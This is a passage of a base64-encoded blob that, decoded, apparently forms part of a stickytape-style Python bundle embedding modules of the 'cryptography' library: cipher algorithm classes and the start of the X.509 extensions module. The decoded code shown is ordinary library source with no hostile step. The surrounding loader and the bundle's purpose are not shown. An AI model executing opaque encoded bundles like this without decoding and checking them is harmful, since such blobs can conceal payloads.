VsZiwgZGF0YTogYnl0ZXMpIC0+IE5vbmU6XHJcbiAgICAgICAgb3V0bGVuID0gc2VsZi5fYmFja2VuZC5fZmZpLm5ldygiaW50ICoiKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfQ2lwaGVyVXBkYXRlKFxyXG4gICAgICAgICAgICBzZWxmLl9jdHgsXHJcbiAgICAgICAgICAgIHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMLFxyXG4gICAgICAgICAgICBvdXRsZW4sXHJcbiAgICAgICAgICAgIHNlbGYuX2JhY2tlbmQuX2ZmaS5mcm9tX2J1ZmZlcihkYXRhKSxcclxuICAgICAgICAgICAgbGVuKGRhdGEpLFxyXG4gICAgICAgIClcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHJlcyAhPSAwKVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHRhZyhzZWxmKSAtPiB0eXBpbmcuT3B0aW9uYWxbYnl0ZXNdOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl90YWdcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NyeXB0b2dyYXBoeS9oYXptYXQvcHJpbWl0aXZlcy9jaXBoZXJzL2FsZ29yaXRobXMucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5cclxuZnJvbSBjcnlwdG9ncmFwaHkgaW1wb3J0IHV0aWxzXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLmNpcGhlcnMgaW1wb3J0IChcclxuICAgIEJsb2NrQ2lwaGVyQWxnb3JpdGhtLFxyXG4gICAgQ2lwaGVyQWxnb3JpdGhtLFxyXG4pXHJcblxyXG5cclxuZGVmIF92ZXJpZnlfa2V5X3NpemUoYWxnb3JpdGhtOiBDaXBoZXJBbGdvcml0aG0sIGtleTogYnl0ZXMpIC0+IGJ5dGVzOlxyXG4gICAgIyBWZXJpZnkgdGhhdCB0aGUga2V5IGlzIGluc3RhbmNlIG9mIGJ5dGVzXHJcbiAgICB1dGlscy5fY2hlY2tfYnl0ZXNsaWtlKCJrZXkiLCBrZXkpXHJcblxyXG4gICAgIyBWZXJpZnkgdGhhdCB0aGUga2V5IHNpemUgbWF0Y2hlcyB0aGUgZXhwZWN0ZWQga2V5IHNpemVcclxuICAgIGlmIGxlbihrZXkpICogOCBub3QgaW4gYWxnb3JpdGhtLmtleV9zaXplczpcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAiSW52YWxpZCBrZXkgc2l6ZSAoe30pIGZvciB7fS4iLmZvcm1hdChcclxuICAgICAgICAgICAgICAgIGxlbihrZXkpICogOCwgYWxnb3JpdGhtLm5hbWVcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIClcclxuICAgIHJldHVybiBrZXlcclxuXHJcblxyXG5jbGFzcyBBRVMoQ2lwaGVyQWxnb3JpdGhtLCBCbG9ja0NpcGhlckFsZ29yaXRobSk6XHJcbiAgICBuYW1lID0gIkFFUyJcclxuICAgIGJsb2NrX3NpemUgPSAxMjhcclxuICAgICMgNTEyIGFkZGVkIHRvIHN1cHBvcnQgQUVTLTI1Ni1YVFMsIHdoaWNoIHVzZXMgNTEyLWJpdCBrZXlzXHJcbiAgICBrZXlfc2l6ZXMgPSBmcm96ZW5zZXQoWzEyOCwgMTkyLCAyNTYsIDUxMl0pXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGtleTogYnl0ZXMpOlxyXG4gICAgICAgIHNlbGYua2V5ID0gX3ZlcmlmeV9rZXlfc2l6ZShzZWxmLCBrZXkpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYga2V5X3NpemUoc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBsZW4oc2VsZi5rZXkpICogOFxyXG5cclxuXHJcbmNsYXNzIENhbWVsbGlhKENpcGhlckFsZ29yaXRobSwgQmxvY2tDaXBoZXJBbGdvcml0aG0pOlxyXG4gICAgbmFtZSA9ICJjYW1lbGxpYSJcclxuICAgIGJsb2NrX3NpemUgPSAxMjhcclxuICAgIGtleV9zaXplcyA9IGZyb3plbnNldChbMTI4LCAxOTIsIDI1Nl0pXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGtleTogYnl0ZXMpOlxyXG4gICAgICAgIHNlbGYua2V5ID0gX3ZlcmlmeV9rZXlfc2l6ZShzZWxmLCBrZXkpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYga2V5X3NpemUoc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBsZW4oc2VsZi5rZXkpICogOFxyXG5cclxuXHJcbmNsYXNzIFRyaXBsZURFUyhDaXBoZXJBbGdvcml0aG0sIEJsb2NrQ2lwaGVyQWxnb3JpdGhtKTpcclxuICAgIG5hbWUgPSAiM0RFUyJcclxuICAgIGJsb2NrX3NpemUgPSA2NFxyXG4gICAga2V5X3NpemVzID0gZnJvemVuc2V0KFs2NCwgMTI4LCAxOTJdKVxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBrZXk6IGJ5dGVzKTpcclxuICAgICAgICBpZiBsZW4oa2V5KSA9PSA4OlxyXG4gICAgICAgICAgICBrZXkgKz0ga2V5ICsga2V5XHJcbiAgICAgICAgZWxpZiBsZW4oa2V5KSA9PSAxNjpcclxuICAgICAgICAgICAga2V5ICs9IGtleVs6OF1cclxuICAgICAgICBzZWxmLmtleSA9IF92ZXJpZnlfa2V5X3NpemUoc2VsZiwga2V5KVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGtleV9zaXplKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gbGVuKHNlbGYua2V5KSAqIDhcclxuXHJcblxyXG5jbGFzcyBCbG93ZmlzaChDaXBoZXJBbGdvcml0aG0sIEJsb2NrQ2lwaGVyQWxnb3JpdGhtKTpcclxuICAgIG5hbWUgPSAiQmxvd2Zpc2giXHJcbiAgICBibG9ja19zaXplID0gNjRcclxuICAgIGtleV9zaXplcyA9IGZyb3plbnNldChyYW5nZSgzMiwgNDQ5LCA4KSlcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwga2V5OiBieXRlcyk6XHJcbiAgICAgICAgc2VsZi5rZXkgPSBfdmVyaWZ5X2tleV9zaXplKHNlbGYsIGtleSlcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBrZXlfc2l6ZShzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGxlbihzZWxmLmtleSkgKiA4XHJcblxyXG5cclxuX0Jsb3dmaXNoSW50ZXJuYWwgPSBCbG93ZmlzaFxyXG51dGlscy5kZXByZWNhdGVkKFxyXG4gICAgQmxvd2Zpc2gsXHJcbiAgICBfX25hbWVfXyxcclxuICAgICJCbG93ZmlzaCBoYXMgYmVlbiBkZXByZWNhdGVkIixcclxuICAgIHV0aWxzLkRlcHJlY2F0ZWRJbjM3LFxyXG4gICAgbmFtZT0iQmxvd2Zpc2giLFxyXG4pXHJcblxyXG5cclxuY2xhc3MgQ0FTVDUoQ2lwaGVyQWxnb3JpdGhtLCBCbG9ja0NpcGhlckFsZ29yaXRobSk6XHJcbiAgICBuYW1lID0gIkNBU1Q1IlxyXG4gICAgYmxvY2tfc2l6ZSA9IDY0XHJcbiAgICBrZXlfc2l6ZXMgPSBmcm96ZW5zZXQocmFuZ2UoNDAsIDEyOSwgOCkpXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGtleTogYnl0ZXMpOlxyXG4gICAgICAgIHNlbGYua2V5ID0gX3ZlcmlmeV9rZXlfc2l6ZShzZWxmLCBrZXkpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYga2V5X3NpemUoc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBsZW4oc2VsZi5rZXkpICogOFxyXG5cclxuXHJcbl9DQVNUNUludGVybmFsID0gQ0FTVDVcclxudXRpbHMuZGVwcmVjYXRlZChcclxuICAgIENBU1Q1LFxyXG4gICAgX19uYW1lX18sXHJcbiAgICAiQ0FTVDUgaGFzIGJlZW4gZGVwcmVjYXRlZCIsXHJcbiAgICB1dGlscy5EZXByZWNhdGVkSW4zNyxcclxuICAgIG5hbWU9IkNBU1Q1IixcclxuKVxyXG5cclxuXHJcbmNsYXNzIEFSQzQoQ2lwaGVyQWxnb3JpdGhtKTpcclxuICAgIG5hbWUgPSAiUkM0IlxyXG4gICAga2V5X3NpemVzID0gZnJvemVuc2V0KFs0MCwgNTYsIDY0LCA4MCwgMTI4LCAxNjAsIDE5MiwgMjU2XSlcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwga2V5OiBieXRlcyk6XHJcbiAgICAgICAgc2VsZi5rZXkgPSBfdmVyaWZ5X2tleV9zaXplKHNlbGYsIGtleSlcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBrZXlfc2l6ZShzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGxlbihzZWxmLmtleSkgKiA4XHJcblxyXG5cclxuY2xhc3MgSURFQShDaXBoZXJBbGdvcml0aG0sIEJsb2NrQ2lwaGVyQWxnb3JpdGhtKTpcclxuICAgIG5hbWUgPSAiSURFQSJcclxuICAgIGJsb2NrX3NpemUgPSA2NFxyXG4gICAga2V5X3NpemVzID0gZnJvemVuc2V0KFsxMjhdKVxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBrZXk6IGJ5dGVzKTpcclxuICAgICAgICBzZWxmLmtleSA9IF92ZXJpZnlfa2V5X3NpemUoc2VsZiwga2V5KVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGtleV9zaXplKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gbGVuKHNlbGYua2V5KSAqIDhcclxuXHJcblxyXG5fSURFQUludGVybmFsID0gSURFQVxyXG51dGlscy5kZXByZWNhdGVkKFxyXG4gICAgSURFQSxcclxuICAgIF9fbmFtZV9fLFxyXG4gICAgIklERUEgaGFzIGJlZW4gZGVwcmVjYXRlZCIsXHJcbiAgICB1dGlscy5EZXByZWNhdGVkSW4zNyxcclxuICAgIG5hbWU9IklERUEiLFxyXG4pXHJcblxyXG5cclxuY2xhc3MgU0VFRChDaXBoZXJBbGdvcml0aG0sIEJsb2NrQ2lwaGVyQWxnb3JpdGhtKTpcclxuICAgIG5hbWUgPSAiU0VFRCJcclxuICAgIGJsb2NrX3NpemUgPSAxMjhcclxuICAgIGtleV9zaXplcyA9IGZyb3plbnNldChbMTI4XSlcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwga2V5OiBieXRlcyk6XHJcbiAgICAgICAgc2VsZi5rZXkgPSBfdmVyaWZ5X2tleV9zaXplKHNlbGYsIGtleSlcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBrZXlfc2l6ZShzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGxlbihzZWxmLmtleSkgKiA4XHJcblxyXG5cclxuX1NFRURJbnRlcm5hbCA9IFNFRURcclxudXRpbHMuZGVwcmVjYXRlZChcclxuICAgIFNFRUQsXHJcbiAgICBfX25hbWVfXyxcclxuICAgICJTRUVEIGhhcyBiZWVuIGRlcHJlY2F0ZWQiLFxyXG4gICAgdXRpbHMuRGVwcmVjYXRlZEluMzcsXHJcbiAgICBuYW1lPSJTRUVEIixcclxuKVxyXG5cclxuXHJcbmNsYXNzIENoYUNoYTIwKENpcGhlckFsZ29yaXRobSk6XHJcbiAgICBuYW1lID0gIkNoYUNoYTIwIlxyXG4gICAga2V5X3NpemVzID0gZnJvemVuc2V0KFsyNTZdKVxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBrZXk6IGJ5dGVzLCBub25jZTogYnl0ZXMpOlxyXG4gICAgICAgIHNlbGYua2V5ID0gX3ZlcmlmeV9rZXlfc2l6ZShzZWxmLCBrZXkpXHJcbiAgICAgICAgdXRpbHMuX2NoZWNrX2J5dGVzbGlrZSgibm9uY2UiLCBub25jZSlcclxuXHJcbiAgICAgICAgaWYgbGVuKG5vbmNlKSAhPSAxNjpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigibm9uY2UgbXVzdCBiZSAxMjgtYml0cyAoMTYgYnl0ZXMpIilcclxuXHJcbiAgICAgICAgc2VsZi5fbm9uY2UgPSBub25jZVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIG5vbmNlKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9ub25jZVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGtleV9zaXplKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gbGVuKHNlbGYua2V5KSAqIDhcclxuXHJcblxyXG5jbGFzcyBTTTQoQ2lwaGVyQWxnb3JpdGhtLCBCbG9ja0NpcGhlckFsZ29yaXRobSk6XHJcbiAgICBuYW1lID0gIlNNNCJcclxuICAgIGJsb2NrX3NpemUgPSAxMjhcclxuICAgIGtleV9zaXplcyA9IGZyb3plbnNldChbMTI4XSlcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwga2V5OiBieXRlcyk6XHJcbiAgICAgICAgc2VsZi5rZXkgPSBfdmVyaWZ5X2tleV9zaXplKHNlbGYsIGtleSlcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBrZXlfc2l6ZShzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGxlbihzZWxmLmtleSkgKiA4XHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdjcnlwdG9ncmFwaHkveDUwOS9leHRlbnNpb25zLnB5JywgYicjIFRoaXMgZmlsZSBpcyBkdWFsIGxpY2Vuc2VkIHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgQXBhY2hlIExpY2Vuc2UsIFZlcnNpb25cclxuIyAyLjAsIGFuZCB0aGUgQlNEIExpY2Vuc2UuIFNlZSB0aGUgTElDRU5TRSBmaWxlIGluIHRoZSByb290IG9mIHRoaXMgcmVwb3NpdG9yeVxyXG4jIGZvciBjb21wbGV0ZSBkZXRhaWxzLlxyXG5cclxuXHJcbmltcG9ydCBhYmNcclxuaW1wb3J0IGRhdGV0aW1lXHJcbmltcG9ydCBoYXNobGliXHJcbmltcG9ydCBpcGFkZHJlc3NcclxuaW1wb3J0IHR5cGluZ1xyXG5cclxuZnJvbSBjcnlwdG9ncmFwaHkgaW1wb3J0IHV0aWxzXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iaW5kaW5ncy5fcnVzdCBpbXBvcnQgYXNuMVxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmluZGluZ3MuX3J1c3QgaW1wb3J0IHg1MDkgYXMgcnVzdF94NTA5XHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzIGltcG9ydCBjb25zdGFudF90aW1lLCBzZXJpYWxpemF0aW9uXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLmFzeW1tZXRyaWMuZWMgaW1wb3J0IEVsbGlwdGljQ3VydmVQdWJsaWNLZXlcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuYXN5bW1ldHJpYy5yc2EgaW1wb3J0IFJTQVB1YmxpY0tleVxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5hc3ltbWV0cmljLnR5cGVzIGltcG9ydCAoXHJcbiAgICBDRVJUSUZJQ0FURV9JU1NVRVJfUFVCTElDX0tFWV9UWVBFUyxcclxuICAgIENFUlRJRklDQVRFX1BVQkxJQ19LRVlfVFlQRVMsXHJcbilcclxuZnJvbSBjcnlwdG9ncmFwaHkueDUwOS5jZXJ0aWZpY2F0ZV90cmFuc3BhcmVuY3kgaW1wb3J0IChcclxuICAgIFNpZ25lZENlcnRpZmljYXRlVGltZXN0YW1wLFxyXG4pXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lng1MDkuZ2VuZXJhbF9uYW1lIGltcG9ydCAoXHJcbiAgICBETlNOYW1lLFxyXG4gICAgRGlyZWN0b3J5TmFtZSxcclxuICAgIEdlbmVyYWxOYW1lLFxyXG4gICAgSVBBZGRyZXNzLFxyXG4gICAgT3RoZXJOYW1lLFxyXG4gICAgUkZDODIyTmFtZSxcclxuICAgIFJlZ2lzdGVyZWRJRCxcclxuICAgIFVuaWZvcm1SZXNvdXJjZUlkZW50aWZpZXIsXHJcbiAgICBfSVBBRERSRVNTX1RZUEVTLFxyXG4pXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lng1MDkubmFtZSBpbXBvcnQgTmFtZSwgUmVsYXRpdmVEaXN0aW5ndWlzaGVkTmFtZVxyXG5mcm9tIGNyeXB0b2dyYXBoeS54NTA5Lm9pZCBpbXBvcnQgKFxyXG4gICAgQ1JMRW50cnlFeHRlbnNpb25PSUQsXHJcbiAgICBFeHRlbnNpb25PSUQsXHJcbiAgICBPQ1NQRXh0ZW5zaW9uT0lELFxyXG4gICAgT2JqZWN0SWRlbnRpZmllcixcclxuKVxyXG5cclxuRXh0ZW5zaW9uVHlwZVZhciA9IHR5cGluZy5UeXBlVmFyKFxyXG4gICAgIkV4dGVuc2lvblR5cGVWYXIiLCBib3VuZD0iRXh0ZW5zaW9uVHlwZSIsIGNvdmFyaWFudD1UcnVlXHJcbilcclxuXHJcblxyXG5kZWYgX2tleV9pZGVudGlmaWVyX2Zyb21fcHVibGljX2tleShcclxuICAgIHB1YmxpY19rZXk6IENFUlRJRklDQVRFX1BVQkxJQ19LRVlfVFlQRVMsXHJcbikgLT4gYnl0ZXM6XHJcbiAgICBpZiBpc2luc3RhbmNlKHB1YmxpY19rZXksIFJTQVB1YmxpY0tleSk6XHJcbiAgICAgICAgZGF0YSA9IHB1YmxpY19rZXkucHVibGljX2J5dGVzKFxyXG4gICAgICAgICAgICBzZXJpYWxpemF0aW9uLkVuY29kaW5nLkRFUixcclxuICAgICAgICAgICAgc2VyaWFsaXphdGlvbi5QdWJsaWNGb3JtYXQuUEtDUzEsXHJcbiAgICAgICAgKVxyXG4gICAgZWxpZiBpc2luc3RhbmNlKHB1YmxpY19rZXksIEVsbGlwdGljQ3VydmVQdWJsaWNLZXkpOlxyXG4gICAgICAgIGRhdGEgPSBwdWJsaWNfa2V5LnB1YmxpY19ieXRlcyhcclxuICAgICAgICAgICAgc2VyaWFsaXphdGlvbi5FbmNvZGluZy5YOTYyLFxyXG4gICAgICAgICAgICBzZXJpYWxpemF0aW9uLlB1YmxpY0Zvcm1hdC5VbmNvbXByZXNzZWRQb2ludCxcclxuICAgICAgICApXHJcbiAgICBlbHNlOlxyXG4gICAgICAgICMgVGhpcyBpcyBhIHZlcnkgc2xvdyB3YXkgdG8gZG8gdGhpcy5cclxuICAgICAgICBzZXJpYWxpemVkID0gcHVibGljX2tleS5wdWJsaWNfYnl0ZXMoXHJcbiAgICAgICAgICAgIHNlcmlhbGl6YXRpb24uRW5jb2RpbmcuREVSLFxyXG4gICAgICAgICAgICBzZXJpYWxpemF0aW9uLlB1YmxpY0Zvcm1hdC5TdWJqZWN0UHVibGljS2V5SW5mbyxcclxuICAgICAgICApXHJcbiAgICAgICAgZGF0YSA9IGFzbjEucGFyc2Vfc3BraV9mb3JfZGF0YShzZXJpYWxpemVkKVxyXG5cclxuICAgIHJldHVybiBoYXNobGliLnNoYTEoZGF0YSkuZGlnZXN0KClcclxuXHJcblxyXG5kZWYgX21ha2Vfc2VxdWVuY2VfbWV0aG9kcyhmaWVsZF9uYW1lOiBzdHIpOlxyXG4gICAgZGVmIGxlbl9tZXRob2Qoc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBsZW4oZ2V0YXR0cihzZWxmLCBmaWVsZF9uYW1lKSlcclxuXHJcbiAgICBkZWYgaXRlcl9tZXRob2Qoc2VsZik6XHJcbiAgICAgICAgcmV0dXJuIGl0ZXIoZ2V0YXR0cihzZWxmLCBmaWVsZF9uYW1lKSlcclxuXHJcbiAgICBkZWYgZ2V0aXRlbV9tZXRob2Qoc2VsZiwgaWR4KTpcclxuICAgICAgICByZXR1cm4gZ2V0YXR0cihzZWxmLCBmaWVsZF9uYW1lKVtpZHhdXHJcblxyXG4gICAgcmV0dXJuIGxlbl9tZXRob2QsIGl0ZXJfbWV0aG9kLCBnZXRpdGVtX21ldGhvZFxyXG5cclxuXHJcbmNsYXNzIER1cGxpY2F0ZUV4dGVuc2lvbihFeGNlcHRpb24pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIG1zZzogc3RyLCBvaWQ6IE9iamVjdElkZW50aWZpZXIpIC0+IE5vbmU6XHJcbiAgICAgICAgc3VwZXIoRHVwbGljYXRlRXh0ZW5zaW9uLCBzZWxmKS5fX2luaXRfXyhtc2cpXHJcbiAgICAgICAgc2VsZi5vaWQgPSBvaWRcclxuXHJcblxyXG5jbGFzcyBFeHRlbnNpb25Ob3RGb3VuZChFeGNlcHRpb24pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIG1zZzogc3RyLCBvaWQ6IE9iamVjdElkZW50aWZpZXIpIC0+IE5vbmU6XHJcbiAgICAgICAgc3VwZXIoRXh0ZW5zaW9uTm90Rm91bmQsIHNlbGYpLl9faW5pdF9fKG1zZylcclxuICAgICAgICBzZWxmLm9pZCA9IG9pZFxyXG5cclxuXHJcbmNsYXNzIEV4dGVuc2lvblR5cGUobWV0YWNsYXNzPWFiYy5BQkNNZXRhKTpcclxuICAgIG9pZDogdHlwaW5nLkNsYXNzVmFyW09iamVjdElkZW50aWZpZXJdXHJcblxyXG4gICAgZGVmIHB1YmxpY19ieXRlcyhzZWxmKSAtPiBieXRlczpcclxuICAgICAgICAiIiJcclxuICAgICAgICBTZXJpYWxpemVzIHRoZSBleHRlbnNpb24gdHlwZSB0byBERVIuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgcmFpc2UgTm90SW1wbGVtZW50ZWRFcnJvcihcclxuICAgICAgICAgICAgInB1YmxpY19ieXRlcyBpcyBub3QgaW1wbGVtZW50ZWQgZm9yIGV4dGVuc2lvbiB0eXBlIHswIXJ9Ii5mb3JtYXQoXHJcbiAgICAgICAgICAgICAgICBzZWxmXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICApXHJcblxyXG5cclxuY2xhc3MgRXh0ZW5zaW9uczpcclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLCBleHRlbnNpb25zOiB0eXBpbmcuSXRlcmFibGVbIkV4dGVuc2lvbltFeHRlbnNpb25UeXBlXSJdXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fZXh0ZW5zaW9ucyA9IGxpc3QoZXh0ZW5zaW9ucylcclxuXHJcbiAgICBkZWYgZ2V0X2V4dGVuc2lvbl9mb3Jfb2lkKFxyXG4gICAgICAgIHNlbGYsIG9pZDogT2JqZWN0SWRlbnRpZmllclxyXG4gICAgKSAtPiAiRXh0ZW5zaW9uW0V4dGVuc2lvblR5cGVdIjpcclxuICAgICAgICBmb3IgZXh0IGluIHNlbGY6XHJcbiAgICAgICAgICAgIGlmIGV4dC5vaWQgPT0gb2lkOlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIGV4dFxyXG5cclxuICAgICAgICByYWlzZSBFeHRlbnNpb25Ob3RGb3VuZCgiTm8ge30gZXh0ZW5zaW9uIHdhcyBmb3VuZCIuZm9ybWF0KG9pZCksIG9pZClcclxuXHJcbiAgICBkZWYgZ2V0X2V4dGVuc2lvbl9mb3JfY2xhc3MoXHJcbiAgICAgICAgc2VsZiwgZXh0Y2xhc3M6IHR5cGluZy5UeXBlW0V4dGVuc2lvblR5cGVWYXJdXHJcbiAgICApIC0+ICJFeHRlbnNpb25bRXh0ZW5zaW9uVHlwZVZhcl0iOlxyXG4gICAgICAgIGlmIGV4dGNsYXNzIGlzIFVucmVjb2duaXplZEV4dGVuc2lvbjpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIlVucmVjb2duaXplZEV4dGVuc2lvbiBjYW5cJ3QgYmUgdXNlZCB3aXRoICJcclxuICAgICAgICAgICAgICAgICJnZXRfZXh0ZW5zaW9uX2Zvcl9jbGFzcyBiZWNhdXNlIG1vcmUgdGhhbiBvbmUgaW5zdGFuY2Ugb2YgdGhlIlxyXG4gICAgICAgICAgICAgICAgIiBjbGFzcyBtYXkgYmUgcHJlc2VudC4iXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgZm9yIGV4dCBpbiBzZWxmOlxyXG4gICAgICAgICAgICBpZiBpc2luc3RhbmNlKGV4dC52YWx1ZSwgZXh0Y2xhc3MpOlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIGV4dFxyXG5cclxuICAgICAgICByYWlzZSBFeHRlbnNpb25Ob3RGb3VuZChcclxuICAgICAgICAgICAgIk5vIHt9IGV4dGVuc2lvbiB3YXMgZm91bmQiLmZvcm1hdChleHRjbGFzcyksIGV4dGNsYXNzLm9pZFxyXG4gICAgICAgIClcclxuXHJcbiAgICBfX2xlbl9fLCBfX2l0ZXJfXywgX19nZXRpdGVtX18gPSBfbWFrZV9zZXF1ZW5jZV9tZXRob2RzKCJfZXh0ZW5zaW9ucyIpXHJcblxyXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gIjxFeHRlbnNpb25zKHt9KT4iLmZvcm1hdChzZWxmLl9leHRlbnNpb25zKVxyXG5cclxuXHJcbmNsYXNzIENSTE51bWJlcihFeHRlbnNpb25UeXBlKTpcclxuICAgIG9pZCA9IEV4dGVuc2lvbk9JRC5DUkxfTlVNQkVSXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNybF9udW1iZXI6IGludCkgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShjcmxfbnVtYmVyLCBpbnQpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoImNybF9udW1iZXIgbXVzdCBiZSBhbiBpbnRlZ2VyIilcclxuXHJcbiAgICAgICAgc2VsZi5fY3JsX251bWJlciA9IGNybF9udW1iZXJcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIENSTE51bWJlcik6XHJcbiAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxyXG5cclxuICAgICAgICByZXR1cm4gc2VsZi5jcmxfbnVtYmVyID09IG90aGVyLmNybF9udW1iZXJcclxuXHJcbiAgICBkZWYgX19oYXNoX18oc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBoYXNoKHNlbGYuY3JsX251bWJlcilcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAiPENSTE51bWJlcih7fSk+Ii5mb3JtYXQoc2VsZi5jcmxfbnVtYmVyKVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGNybF9udW1iZXIoc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9jcmxfbnVtYmVyXHJcblxyXG4gICAgZGVmIHB1YmxpY19ieXRlcyhzZWxmKSAtPiBieXRlczpcclxuICAgICAgICByZXR1cm4gcnVzdF94NTA5LmVuY29kZV9leHRlbnNpb25fdmFsdWUoc2VsZilcclxuXHJcblxyXG5jbGFzcyBBdXRob3JpdHlLZXlJZGVudGlmaWVyKEV4dGVuc2lvblR5cGUpOlxyXG4gICAgb2lkID0gRXh0ZW5zaW9uT0lELkFVVEhPUklUWV9LRVlfSURFTlRJRklFUlxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGtleV9pZGVudGlmaWVyOiB0eXBpbmcuT3B0aW9uYWxbYnl0ZXNdLFxyXG4gICAgICAgIGF1dGhvcml0eV9jZXJ0X2lzc3VlcjogdHlwaW5nLk9wdGlvbmFsW3R5cGluZy5JdGVyYWJsZVtHZW5lcmFsTmFtZV1dLFxyXG4gICAgICAgIGF1dGhvcml0eV9jZXJ0X3NlcmlhbF9udW1iZXI6IHR5cGluZy5PcHRpb25hbFtpbnRdLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIChhdXRob3JpdHlfY2VydF9pc3N1ZXIgaXMgTm9uZSkgIT0gKFxyXG4gICAgICAgICAgICBhdXRob3JpdHlfY2VydF9zZXJpYWx